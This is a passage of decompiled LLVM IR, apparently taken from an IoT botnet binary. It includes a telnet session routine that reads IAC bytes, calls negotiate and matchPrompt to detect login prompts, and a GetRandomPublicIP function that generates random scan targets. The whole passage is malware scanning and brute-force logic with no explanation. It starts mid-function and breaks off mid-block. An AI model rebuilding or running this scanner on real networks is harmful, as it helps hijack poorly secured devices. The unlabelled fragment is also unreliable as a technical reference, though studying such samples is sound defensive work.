  %v1_8049c35 = add i32 %arg1, 1
  %v2_8049c36 = ptrtoint i32* %stack_var_-168 to i32
  %v5_8049c6d = ptrtoint i8* %arg6 to i32
  %v2_8049d41 = inttoptr i32 %arg2 to i8*
  %v4_8049d4a = icmp eq i32 %arg3, 0
  %v1_8049d6b34 = add i32 %arg8, 2
  %v5_8049d7143 = icmp slt i32 %v1_8049d6b34, %arg7
  br i1 %v5_8049d7143, label %dec_label_pc_8049d73.lr.ph, label %dec_label_pc_8049d8f

dec_label_pc_8049d73.lr.ph:                       ; preds = %entry
  %v2_8049c21 = udiv i32 %arg1, 32
  %v2_8049c2a = mul nuw nsw i32 %v2_8049c21, 4
  %v3_8049c2a = add nsw i32 %v2_8049c2a, -156
  %tmp31 = icmp slt i32 %arg5, 1
  %tmp32 = icmp eq i1 %tmp31, false
  br label %dec_label_pc_8049d73

dec_label_pc_8049c03:                             ; preds = %dec_label_pc_8049d81, %dec_label_pc_8049d73
  store i32 %v2_8049c0d, i32* @edi, align 4
  %v5_8049c14 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v0_8049c2a = load i32, i32* @ebp, align 4
  %v4_8049c2a = add i32 %v3_8049c2a, %v0_8049c2a
  %v5_8049c2a = inttoptr i32 %v4_8049c2a to i32*
  %v6_8049c2a = load i32, i32* %v5_8049c2a, align 4
  %v12_8049c2a = or i32 %v6_8049c2a, %v9_8049c2a
  store i32 %v12_8049c2a, i32* %v5_8049c2a, align 4
  %v5_8049c5d = call i32 @__libc_select(i32 %v1_8049c35, i32 %v2_8049c0d, i32 0, i32 0, i32 %v2_8049c36)
  %tmp28 = icmp slt i32 %v5_8049c5d, 1
  br i1 %tmp28, label %dec_label_pc_8049d8f, label %dec_label_pc_8049c6a

dec_label_pc_8049c6a:                             ; preds = %dec_label_pc_8049c03
  %v6_8049c6d = add i32 %stack_var_-32.044, %v5_8049c6d
  %v5_8049c70 = inttoptr i32 %v6_8049c6d to i8*
  %v4_8049c90 = call i32 @__libc_recv(i32 %arg1, i32 %v6_8049c6d, i32 1, i32 0)
  %v13_8049c98 = icmp eq i32 %v4_8049c90, -1
  br i1 %v13_8049c98, label %dec_label_pc_8049dab, label %dec_label_pc_8049c9e

dec_label_pc_8049c9e:                             ; preds = %dec_label_pc_8049c6a
  %v4_8049c9e = icmp eq i32 %v4_8049c90, 0
  %v1_8049ca2 = icmp eq i1 %v4_8049c9e, false
  br i1 %v1_8049ca2, label %dec_label_pc_8049cb3, label %dec_label_pc_8049dab

dec_label_pc_8049cb3:                             ; preds = %dec_label_pc_8049c9e
  %v5_8049cb6 = add i32 %v4_8049c90, %stack_var_-32.044
  %v2_8049cbc = load i8, i8* %v5_8049c70, align 1
  %v11_8049cbf = icmp eq i8 %v2_8049cbc, -1
  %v1_8049cc1 = icmp eq i1 %v11_8049cbf, false
  br i1 %v1_8049cc1, label %dec_label_pc_8049d34, label %dec_label_pc_8049cc3

dec_label_pc_8049cc3:                             ; preds = %dec_label_pc_8049cb3
  %v1_8049cc6 = add i32 %v6_8049c6d, 1
  %v4_8049ce1 = call i32 @__libc_recv(i32 %arg1, i32 %v1_8049cc6, i32 2, i32 0)
  %v13_8049ce9 = icmp eq i32 %v4_8049ce1, -1
  br i1 %v13_8049ce9, label %dec_label_pc_8049dab, label %dec_label_pc_8049cef

dec_label_pc_8049cef:                             ; preds = %dec_label_pc_8049cc3
  %v4_8049cef = icmp eq i32 %v4_8049ce1, 0
  %v1_8049cf3 = icmp eq i1 %v4_8049cef, false
  br i1 %v1_8049cf3, label %dec_label_pc_8049d04, label %dec_label_pc_8049dab

dec_label_pc_8049d04:                             ; preds = %dec_label_pc_8049cef
  %v5_8049d07 = add i32 %v4_8049ce1, %v5_8049cb6
  %v3_8049d1f = call i32 @negotiate(i32 %arg1, i32 %v6_8049c6d, i32 3)
  %v1_8049d24 = icmp eq i32 %v3_8049d1f, 0
  %v1_8049d26 = icmp eq i1 %v1_8049d24, false
  br i1 %v1_8049d26, label %dec_label_pc_8049d68.backedge, label %dec_label_pc_8049dab

dec_label_pc_8049d68.backedge:                    ; preds = %dec_label_pc_8049d04, %dec_label_pc_8049d4a, %dec_label_pc_8049d50
  %stack_var_-32.0.be = phi i32 [ %v5_8049cb6, %dec_label_pc_8049d4a ], [ %v5_8049cb6, %dec_label_pc_8049d50 ], [ %v5_8049d07, %dec_label_pc_8049d04 ]
  %v1_8049d6b = add i32 %stack_var_-32.0.be, 2
  %v5_8049d71 = icmp slt i32 %v1_8049d6b, %arg7
  br i1 %v5_8049d71, label %dec_label_pc_8049d68.backedge.dec_label_pc_8049d73_crit_edge, label %dec_label_pc_8049d8f

dec_label_pc_8049d68.backedge.dec_label_pc_8049d73_crit_edge: ; preds = %dec_label_pc_8049d68.backedge
  %v3_8049d73.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_8049d73

dec_label_pc_8049d34:                             ; preds = %dec_label_pc_8049cb3
  %v3_8049d41 = call i32 @strstr(i32 %v5_8049c6d, i8* %v2_8049d41)
  %v1_8049d46 = icmp eq i32 %v3_8049d41, 0
  %v1_8049d48 = icmp eq i1 %v1_8049d46, false
  br i1 %v1_8049d48, label %dec_label_pc_8049d8f, label %dec_label_pc_8049d4a

dec_label_pc_8049d4a:                             ; preds = %dec_label_pc_8049d34
  br i1 %v4_8049d4a, label %dec_label_pc_8049d68.backedge, label %dec_label_pc_8049d50

dec_label_pc_8049d50:                             ; preds = %dec_label_pc_8049d4a
  %v2_8049d56 = call i32 @matchPrompt(i8* %arg6)
  %v1_8049d5b = icmp eq i32 %v2_8049d56, 0
  br i1 %v1_8049d5b, label %dec_label_pc_8049d68.backedge, label %dec_label_pc_8049d8f

dec_label_pc_8049d73:                             ; preds = %dec_label_pc_8049d68.backedge.dec_label_pc_8049d73_crit_edge, %dec_label_pc_8049d73.lr.ph
  %v3_8049d73 = phi i32 [ %arg4, %dec_label_pc_8049d73.lr.ph ], [ %v3_8049d73.pre, %dec_label_pc_8049d68.backedge.dec_label_pc_8049d73_crit_edge ]
  %stack_var_-32.044 = phi i32 [ %arg8, %dec_label_pc_8049d73.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_8049d68.backedge.dec_label_pc_8049d73_crit_edge ]
  %tmp29 = icmp slt i32 %v3_8049d73, 1
  %tmp30 = icmp eq i1 %tmp29, false
  br i1 %tmp30, label %dec_label_pc_8049c03, label %dec_label_pc_8049d81

dec_label_pc_8049d81:                             ; preds = %dec_label_pc_8049d73
  br i1 %tmp32, label %dec_label_pc_8049c03, label %dec_label_pc_8049d8f

dec_label_pc_8049d8f:                             ; preds = %dec_label_pc_8049c03, %dec_label_pc_8049d81, %dec_label_pc_8049d68.backedge, %dec_label_pc_8049d50, %dec_label_pc_8049d34, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_8049d34 ], [ 1, %dec_label_pc_8049d50 ], [ 0, %dec_label_pc_8049d68.backedge ], [ 0, %dec_label_pc_8049d81 ], [ 0, %dec_label_pc_8049c03 ]
  br label %dec_label_pc_8049dab

dec_label_pc_8049dab:                             ; preds = %dec_label_pc_8049d04, %dec_label_pc_8049cc3, %dec_label_pc_8049cef, %dec_label_pc_8049c6a, %dec_label_pc_8049c9e, %dec_label_pc_8049d8f
  %stack_var_-172.0 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8049d8f ], [ 0, %dec_label_pc_8049c9e ], [ 0, %dec_label_pc_8049c6a ], [ 0, %dec_label_pc_8049cef ], [ 0, %dec_label_pc_8049cc3 ], [ 0, %dec_label_pc_8049d04 ]
  ret i32 %stack_var_-172.0

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v4_8049ce1, { 1, 2, 0 }
  uselistorder i32 %v4_8049c90, { 1, 2, 0 }
  uselistorder i32 %v5_8049c6d, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049dab, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_8049d8f, { 1, 3, 4, 2, 0, 5 }
  uselistorder label %dec_label_pc_8049d68.backedge, { 2, 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049dbd = load i32, i32* @ebx, align 4
  store i32 %v0_8049dbd, i32* %stack_var_-8, align 4
  store i8 0, i8* @global_var_8062597.38, align 1
  store i8 0, i8* @global_var_8062598.39, align 8
  store i8 0, i8* @global_var_8062599.40, align 1
  store i8 0, i8* @global_var_806259a.41, align 2
  %v1_8049ddd = call i32 @random()
  %v2_8049dff = sdiv i32 %v1_8049ddd, 51
  store i32 %v2_8049dff, i32* @ebx, align 4
  %tmp = mul i32 %v2_8049dff, -255
  %v2_8049e0f = add i32 %v1_8049ddd, %tmp
  %v14_8049e0f = trunc i32 %v2_8049e0f to i8
  store i32 %v2_8049e0f, i32* @eax, align 4
  store i8 %v14_8049e0f, i8* @global_var_8062597.38, align 1
  %v1_8049e1d = call i32 @random()
  %v2_8049e3f = sdiv i32 %v1_8049e1d, 51
  store i32 %v2_8049e3f, i32* @ebx, align 4
  %tmp21 = mul i32 %v2_8049e3f, -255
  %v2_8049e4f = add i32 %v1_8049e1d, %tmp21
  %v14_8049e4f = trunc i32 %v2_8049e4f to i8
  store i32 %v2_8049e4f, i32* @eax, align 4
  store i8 %v14_8049e4f, i8* @global_var_8062598.39, align 8
  %v1_8049e5d = call i32 @random()
  %v2_8049e7f = sdiv i32 %v1_8049e5d, 51
  store i32 %v2_8049e7f, i32* @ebx, align 4
  %tmp22 = mul i32 %v2_8049e7f, -255
  %v2_8049e8f = add i32 %v1_8049e5d, %tmp22
  %v14_8049e8f = trunc i32 %v2_8049e8f to i8
  store i32 %v2_8049e8f, i32* @eax, align 4
  store i8 %v14_8049e8f, i8* @global_var_8062599.40, align 1
  %v1_8049e9d = call i32 @random()
  %v2_8049ebf = sdiv i32 %v1_8049e9d, 51
  store i32 %v2_8049ebf, i32* @ebx, align 4
  %tmp23 = mul i32 %v2_8049ebf, -255
  %v2_8049ecf = add i32 %v1_8049e9d, %tmp23
  %v14_8049ecf = trunc i32 %v2_8049ecf to i8
  store i32 %v2_8049ecf, i32* @eax, align 4
  store i8 %v14_8049ecf, i8* @global_var_806259a.41, align 2
  %v1_8049edd = call i32 @random()
  %v2_8049efa = srem i32 %v1_8049edd, 115
  %v12_8049f09 = icmp eq i32 %v2_8049efa, 0
  store i32 %v2_8049efa, i32* @edx, align 4
  %v1_8049f14 = icmp eq i1 %v12_8049f09, false
  br i1 %v1_8049f14, label %dec_label_pc_8049f46, label %dec_label_pc_8049f16

dec_label_pc_8049f16:                             ; preds = %entry
  %v0_8049f16 = load i8, i8* @global_var_806259a.41, align 2
  %v1_8049f16 = zext i8 %v0_8049f16 to i32
  store i32 %v1_8049f16, i32* @edx, align 4
  %v0_8049f20 = load i8, i8* @global_var_8062599.40, align 1
  %v1_8049f20 = zext i8 %v0_8049f20 to i32
  %v2_8049f2f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f2f, i32* @ebx, align 4
  %v4_8049f41 = call i32 @szprintf(i32 %v2_8049f2f, i32 ptrtoint ([13 x i8]* @global_var_8057963.42 to i32), i32 %v1_8049f20)
  br label %dec_label_pc_8049f46

dec_label_pc_8049f46:                             ; preds = %entry, %dec_label_pc_8049f16
  %v13_8049f46 = icmp eq i32 %v2_8049efa, 1
  %v1_8049f4a = icmp eq i1 %v13_8049f46, false
  br i1 %v1_8049f4a, label %dec_label_pc_8049f7c, label %dec_label_pc_8049f4c

dec_label_pc_8049f4c:                             ; preds = %dec_label_pc_8049f46
  %v0_8049f4c = load i8, i8* @global_var_806259a.41, align 2
  %v1_8049f4c = zext i8 %v0_8049f4c to i32
  store i32 %v1_8049f4c, i32* @edx, align 4
  %v0_8049f56 = load i8, i8* @global_var_8062599.40, align 1
  %v1_8049f56 = zext i8 %v0_8049f56 to i32
  %v2_8049f65 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f65, i32* @ebx, align 4
  %v4_8049f77 = call i32 @szprintf(i32 %v2_8049f65, i32 ptrtoint ([13 x i8]* @global_var_8057970.43 to i32), i32 %v1_8049f56)
  br label %dec_label_pc_8049f7c

dec_label_pc_8049f7c:                             ; preds = %dec_label_pc_8049f46, %dec_label_pc_8049f4c
  %v13_8049f7c = icmp eq i32 %v2_8049efa, 2
  %v1_8049f80 = icmp eq i1 %v13_8049f7c, false
  br i1 %v1_8049f80, label %dec_label_pc_8049fb2, label %dec_label_pc_8049f82

dec_label_pc_8049f82:                             ; preds = %dec_label_pc_8049f7c
  %v0_8049f82 = load i8, i8* @global_var_806259a.41, align 2
  %v1_8049f82 = zext i8 %v0_8049f82 to i32
  store i32 %v1_8049f82, i32* @edx, align 4
  %v0_8049f8c = load i8, i8* @global_var_8062599.40, align 1
  %v1_8049f8c = zext i8 %v0_8049f8c to i32
  %v2_8049f9b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f9b, i32* @ebx, align 4
  %v4_8049fad = call i32 @szprintf(i32 %v2_8049f9b, i32 ptrtoint ([11 x i8]* @global_var_805797d.44 to i32), i32 %v1_8049f8c)
  br label %dec_label_pc_8049fb2

dec_label_pc_8049fb2:                             ; preds = %dec_label_pc_8049f7c, %dec_label_pc_8049f82
  %v13_8049fb2 = icmp eq i32 %v2_8049efa, 3
  %v1_8049fb6 = icmp eq i1 %v13_8049fb2, false
  br i1 %v1_8049fb6, label %dec_label_pc_8049fe8, label %dec_label_pc_8049fb8

dec_label_pc_8049fb8:                             ; preds = %dec_label_pc_8049fb2
  %v0_8049fb8 = load i8, i8* @global_var_806259a.41, align 2
  %v1_8049fb8 = zext i8 %v0_8049fb8 to i32
  store i32 %v1_8049fb8, i32* @edx, align 4
  %v0_8049fc2 = load i8, i8* @global_var_8062599.40, align 1
  %v1_8049fc2 = zext i8 %v0_8049fc2 to i32
  %v2_8049fd1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049fd1, i32* @ebx, align 4
  %v4_8049fe3 = call i32 @szprintf(i32 %v2_8049fd1, i32 ptrtoint ([13 x i8]* @global_var_8057988.45 to i32), i32 %v1_8049fc2)
  br label %dec_label_pc_8049fe8

dec_label_pc_8049fe8:                             ; preds = %dec_label_pc_8049fb2, %dec_label_pc_8049fb8
  %v13_8049fe8 = icmp eq i32 %v2_8049efa, 4
  %v1_8049fec = icmp eq i1 %v13_8049fe8, false
  br i1 %v1_8049fec, label %dec_label_pc_804a01e, label %dec_label_pc_8049fee

dec_label_pc_8049fee:                             ; preds = %dec_label_pc_8049fe8
  %v0_8049fee = load i8, i8* @global_var_806259a.41, align 2
  %v1_8049fee = zext i8 %v0_8049fee to i32
  store i32 %v1_8049fee, i32* @edx, align 4
  %v0_8049ff8 = load i8, i8* @global_var_8062599.40, align 1
  %v1_8049ff8 = zext i8 %v0_8049ff8 to i32
  %v2_804a007 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a007, i32* @ebx, align 4
  %v4_804a019 = call i32 @szprintf(i32 %v2_804a007, i32 ptrtoint ([11 x i8]* @global_var_8057995.46 to i32), i32 %v1_8049ff8)
  br label %dec_label_pc_804a01e

dec_label_pc_804a01e:                             ; preds = %dec_label_pc_8049fe8, %dec_label_pc_8049fee
  %v13_804a01e = icmp eq i32 %v2_8049efa, 5
  %v1_804a022 = icmp eq i1 %v13_804a01e, false
  br i1 %v1_804a022, label %dec_label_pc_804a054, label %dec_label_pc_804a024

dec_label_pc_804a024:                             ; preds = %dec_label_pc_804a01e
  %v0_804a024 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a024 = zext i8 %v0_804a024 to i32
  store i32 %v1_804a024, i32* @edx, align 4
  %v0_804a02e = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a02e = zext i8 %v0_804a02e to i32
  %v2_804a03d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a03d, i32* @ebx, align 4
  %v4_804a04f = call i32 @szprintf(i32 %v2_804a03d, i32 ptrtoint ([13 x i8]* @global_var_80579a0.47 to i32), i32 %v1_804a02e)
  br label %dec_label_pc_804a054

dec_label_pc_804a054:                             ; preds = %dec_label_pc_804a01e, %dec_label_pc_804a024
  %v13_804a054 = icmp eq i32 %v2_8049efa, 6
  %v1_804a058 = icmp eq i1 %v13_804a054, false
  br i1 %v1_804a058, label %dec_label_pc_804a08a, label %dec_label_pc_804a05a

dec_label_pc_804a05a:                             ; preds = %dec_label_pc_804a054
  %v0_804a05a = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a05a = zext i8 %v0_804a05a to i32
  store i32 %v1_804a05a, i32* @edx, align 4
  %v0_804a064 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a064 = zext i8 %v0_804a064 to i32
  %v2_804a073 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a073, i32* @ebx, align 4
  %v4_804a085 = call i32 @szprintf(i32 %v2_804a073, i32 ptrtoint ([12 x i8]* @global_var_80579ad.48 to i32), i32 %v1_804a064)
  br label %dec_label_pc_804a08a

dec_label_pc_804a08a:                             ; preds = %dec_label_pc_804a054, %dec_label_pc_804a05a
  %v13_804a08a = icmp eq i32 %v2_8049efa, 7
  %v1_804a08e = icmp eq i1 %v13_804a08a, false
  br i1 %v1_804a08e, label %dec_label_pc_804a0c0, label %dec_label_pc_804a090

dec_label_pc_804a090:                             ; preds = %dec_label_pc_804a08a
  %v0_804a090 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a090 = zext i8 %v0_804a090 to i32
  store i32 %v1_804a090, i32* @edx, align 4
  %v0_804a09a = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a09a = zext i8 %v0_804a09a to i32
  %v2_804a0a9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0a9, i32* @ebx, align 4
  %v4_804a0bb = call i32 @szprintf(i32 %v2_804a0a9, i32 ptrtoint ([13 x i8]* @global_var_80579b9.49 to i32), i32 %v1_804a09a)
  br label %dec_label_pc_804a0c0

dec_label_pc_804a0c0:                             ; preds = %dec_label_pc_804a08a, %dec_label_pc_804a090
  %v13_804a0c0 = icmp eq i32 %v2_8049efa, 8
  %v1_804a0c4 = icmp eq i1 %v13_804a0c0, false
  br i1 %v1_804a0c4, label %dec_label_pc_804a0f6, label %dec_label_pc_804a0c6

dec_label_pc_804a0c6:                             ; preds = %dec_label_pc_804a0c0
  %v0_804a0c6 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a0c6 = zext i8 %v0_804a0c6 to i32
  store i32 %v1_804a0c6, i32* @edx, align 4
  %v0_804a0d0 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a0d0 = zext i8 %v0_804a0d0 to i32
  %v2_804a0df = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0df, i32* @ebx, align 4
  %v4_804a0f1 = call i32 @szprintf(i32 %v2_804a0df, i32 ptrtoint ([13 x i8]* @global_var_80579c6.50 to i32), i32 %v1_804a0d0)
  br label %dec_label_pc_804a0f6

dec_label_pc_804a0f6:                             ; preds = %dec_label_pc_804a0c0, %dec_label_pc_804a0c6
  %v13_804a0f6 = icmp eq i32 %v2_8049efa, 9
  %v1_804a0fa = icmp eq i1 %v13_804a0f6, false
  br i1 %v1_804a0fa, label %dec_label_pc_804a12c, label %dec_label_pc_804a0fc

dec_label_pc_804a0fc:                             ; preds = %dec_label_pc_804a0f6
  %v0_804a0fc = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a0fc = zext i8 %v0_804a0fc to i32
  store i32 %v1_804a0fc, i32* @edx, align 4
  %v0_804a106 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a106 = zext i8 %v0_804a106 to i32
  %v2_804a115 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a115, i32* @ebx, align 4
  %v4_804a127 = call i32 @szprintf(i32 %v2_804a115, i32 ptrtoint ([13 x i8]* @global_var_80579d3.51 to i32), i32 %v1_804a106)
  br label %dec_label_pc_804a12c

dec_label_pc_804a12c:                             ; preds = %dec_label_pc_804a0f6, %dec_label_pc_804a0fc
  %v13_804a12c = icmp eq i32 %v2_8049efa, 10
  %v1_804a130 = icmp eq i1 %v13_804a12c, false
  br i1 %v1_804a130, label %dec_label_pc_804a162, label %dec_label_pc_804a132

dec_label_pc_804a132:                             ; preds = %dec_label_pc_804a12c
  %v0_804a132 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a132 = zext i8 %v0_804a132 to i32
  store i32 %v1_804a132, i32* @edx, align 4
  %v0_804a13c = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a13c = zext i8 %v0_804a13c to i32
  %v2_804a14b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a14b, i32* @ebx, align 4
  %v4_804a15d = call i32 @szprintf(i32 %v2_804a14b, i32 ptrtoint ([13 x i8]* @global_var_80579e0.52 to i32), i32 %v1_804a13c)
  br label %dec_label_pc_804a162

dec_label_pc_804a162:                             ; preds = %dec_label_pc_804a12c, %dec_label_pc_804a132
  %v13_804a162 = icmp eq i32 %v2_8049efa, 11
  %v1_804a166 = icmp eq i1 %v13_804a162, false
  br i1 %v1_804a166, label %dec_label_pc_804a198, label %dec_label_pc_804a168

dec_label_pc_804a168:                             ; preds = %dec_label_pc_804a162
  %v0_804a168 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a168 = zext i8 %v0_804a168 to i32
  store i32 %v1_804a168, i32* @edx, align 4
  %v0_804a172 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a172 = zext i8 %v0_804a172 to i32
  %v2_804a181 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a181, i32* @ebx, align 4
  %v4_804a193 = call i32 @szprintf(i32 %v2_804a181, i32 ptrtoint ([11 x i8]* @global_var_80579ed.53 to i32), i32 %v1_804a172)
  br label %dec_label_pc_804a198

dec_label_pc_804a198:                             ; preds = %dec_label_pc_804a162, %dec_label_pc_804a168
  %v13_804a198 = icmp eq i32 %v2_8049efa, 12
  %v1_804a19c = icmp eq i1 %v13_804a198, false
  br i1 %v1_804a19c, label %dec_label_pc_804a1ce, label %dec_label_pc_804a19e

dec_label_pc_804a19e:                             ; preds = %dec_label_pc_804a198
  %v0_804a19e = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a19e = zext i8 %v0_804a19e to i32
  store i32 %v1_804a19e, i32* @edx, align 4
  %v0_804a1a8 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a1a8 = zext i8 %v0_804a1a8 to i32
  %v2_804a1b7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1b7, i32* @ebx, align 4
  %v4_804a1c9 = call i32 @szprintf(i32 %v2_804a1b7, i32 ptrtoint ([13 x i8]* @global_var_8057970.43 to i32), i32 %v1_804a1a8)
  br label %dec_label_pc_804a1ce

dec_label_pc_804a1ce:                             ; preds = %dec_label_pc_804a198, %dec_label_pc_804a19e
  %v13_804a1ce = icmp eq i32 %v2_8049efa, 13
  %v1_804a1d2 = icmp eq i1 %v13_804a1ce, false
  br i1 %v1_804a1d2, label %dec_label_pc_804a204, label %dec_label_pc_804a1d4

dec_label_pc_804a1d4:                             ; preds = %dec_label_pc_804a1ce
  %v0_804a1d4 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a1d4 = zext i8 %v0_804a1d4 to i32
  store i32 %v1_804a1d4, i32* @edx, align 4
  %v0_804a1de = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a1de = zext i8 %v0_804a1de to i32
  %v2_804a1ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1ed, i32* @ebx, align 4
  %v4_804a1ff = call i32 @szprintf(i32 %v2_804a1ed, i32 ptrtoint ([13 x i8]* @global_var_80579f8.54 to i32), i32 %v1_804a1de)
  br label %dec_label_pc_804a204

dec_label_pc_804a204:                             ; preds = %dec_label_pc_804a1ce, %dec_label_pc_804a1d4
  %v13_804a204 = icmp eq i32 %v2_8049efa, 14
  %v1_804a208 = icmp eq i1 %v13_804a204, false
  br i1 %v1_804a208, label %dec_label_pc_804a23a, label %dec_label_pc_804a20a

dec_label_pc_804a20a:                             ; preds = %dec_label_pc_804a204
  %v0_804a20a = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a20a = zext i8 %v0_804a20a to i32
  store i32 %v1_804a20a, i32* @edx, align 4
  %v0_804a214 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a214 = zext i8 %v0_804a214 to i32
  %v2_804a223 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a223, i32* @ebx, align 4
  %v4_804a235 = call i32 @szprintf(i32 %v2_804a223, i32 ptrtoint ([13 x i8]* @global_var_8057a05.55 to i32), i32 %v1_804a214)
  br label %dec_label_pc_804a23a

dec_label_pc_804a23a:                             ; preds = %dec_label_pc_804a204, %dec_label_pc_804a20a
  %v13_804a23a = icmp eq i32 %v2_8049efa, 15
  %v1_804a23e = icmp eq i1 %v13_804a23a, false
  br i1 %v1_804a23e, label %dec_label_pc_804a270, label %dec_label_pc_804a240

dec_label_pc_804a240:                             ; preds = %dec_label_pc_804a23a
  %v0_804a240 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a240 = zext i8 %v0_804a240 to i32
  store i32 %v1_804a240, i32* @edx, align 4
  %v0_804a24a = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a24a = zext i8 %v0_804a24a to i32
  %v2_804a259 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a259, i32* @ebx, align 4
  %v4_804a26b = call i32 @szprintf(i32 %v2_804a259, i32 ptrtoint ([13 x i8]* @global_var_8057a12.56 to i32), i32 %v1_804a24a)
  br label %dec_label_pc_804a270

dec_label_pc_804a270:                             ; preds = %dec_label_pc_804a23a, %dec_label_pc_804a240
  %v10_804a270 = icmp eq i32 %v2_8049efa, 16
  %v1_804a274 = icmp eq i1 %v10_804a270, false
  br i1 %v1_804a274, label %dec_label_pc_804a2a6, label %dec_label_pc_804a276

dec_label_pc_804a276:                             ; preds = %dec_label_pc_804a270
  %v0_804a276 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a276 = zext i8 %v0_804a276 to i32
  store i32 %v1_804a276, i32* @edx, align 4
  %v0_804a280 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a280 = zext i8 %v0_804a280 to i32
  %v2_804a28f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a28f, i32* @ebx, align 4
  %v4_804a2a1 = call i32 @szprintf(i32 %v2_804a28f, i32 ptrtoint ([13 x i8]* @global_var_8057a1f.57 to i32), i32 %v1_804a280)
  br label %dec_label_pc_804a2a6

dec_label_pc_804a2a6:                             ; preds = %dec_label_pc_804a270, %dec_label_pc_804a276
  %v13_804a2a6 = icmp eq i32 %v2_8049efa, 17
  %v1_804a2aa = icmp eq i1 %v13_804a2a6, false
  br i1 %v1_804a2aa, label %dec_label_pc_804a2dc, label %dec_label_pc_804a2ac

dec_label_pc_804a2ac:                             ; preds = %dec_label_pc_804a2a6
  %v0_804a2ac = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a2ac = zext i8 %v0_804a2ac to i32
  store i32 %v1_804a2ac, i32* @edx, align 4
  %v0_804a2b6 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a2b6 = zext i8 %v0_804a2b6 to i32
  %v2_804a2c5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2c5, i32* @ebx, align 4
  %v4_804a2d7 = call i32 @szprintf(i32 %v2_804a2c5, i32 ptrtoint ([13 x i8]* @global_var_8057a2c.58 to i32), i32 %v1_804a2b6)
  br label %dec_label_pc_804a2dc

dec_label_pc_804a2dc:                             ; preds = %dec_label_pc_804a2a6, %dec_label_pc_804a2ac
  %v13_804a2dc = icmp eq i32 %v2_8049efa, 18
  %v1_804a2e0 = icmp eq i1 %v13_804a2dc, false
  br i1 %v1_804a2e0, label %dec_label_pc_804a312, label %dec_label_pc_804a2e2

dec_label_pc_804a2e2:                             ; preds = %dec_label_pc_804a2dc
  %v0_804a2e2 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a2e2 = zext i8 %v0_804a2e2 to i32
  store i32 %v1_804a2e2, i32* @edx, align 4
  %v0_804a2ec = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a2ec = zext i8 %v0_804a2ec to i32
  %v2_804a2fb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2fb, i32* @ebx, align 4
  %v4_804a30d = call i32 @szprintf(i32 %v2_804a2fb, i32 ptrtoint ([13 x i8]* @global_var_8057a39.59 to i32), i32 %v1_804a2ec)
  br label %dec_label_pc_804a312

dec_label_pc_804a312:                             ; preds = %dec_label_pc_804a2dc, %dec_label_pc_804a2e2
  %v13_804a312 = icmp eq i32 %v2_8049efa, 19
  %v1_804a316 = icmp eq i1 %v13_804a312, false
  br i1 %v1_804a316, label %dec_label_pc_804a348, label %dec_label_pc_804a318

dec_label_pc_804a318:                             ; preds = %dec_label_pc_804a312
  %v0_804a318 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804a318 = zext i8 %v0_804a318 to i32
  store i32 %v1_804a318, i32* @edx, align 4
  %v0_804a322 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804a322 = zext i8 %v0_804a322 to i32
  %v2_804a331 = ptrtoint i32* %stack_var_-28 to i32
